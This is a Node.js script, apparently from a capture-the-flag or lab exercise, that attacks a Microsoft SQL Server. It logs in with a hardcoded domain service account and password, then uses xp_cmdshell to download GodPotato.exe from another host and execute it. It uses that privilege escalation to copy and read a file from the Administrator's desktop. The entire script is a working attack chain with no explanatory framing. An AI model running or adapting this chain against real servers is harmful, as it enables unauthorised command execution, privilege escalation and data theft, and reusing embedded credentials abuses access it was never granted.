const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true, enableArithAbort: true },
    port: 1433,
  });
  const q = async (s) => {
    try {
      const r = await sql.query(s);
      console.log("=>", JSON.stringify(r.recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://172.16.0.12:8080/GodPotato.exe -OutFile C:/Users/Public/GodPotato.exe\"'"
  );
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public\\GodPotato.exe'");
  await q(
    "EXEC xp_cmdshell 'C:\\Users\\Public\\GodPotato.exe -cmd \"cmd /c type C:\\Users\\Administrator\\Desktop\\user.txt > C:\\Users\\Public\\uf.txt\"'"
  );
  await q("EXEC xp_cmdshell 'type C:\\Users\\Public\\uf.txt'");
  process.exit(0);
})();
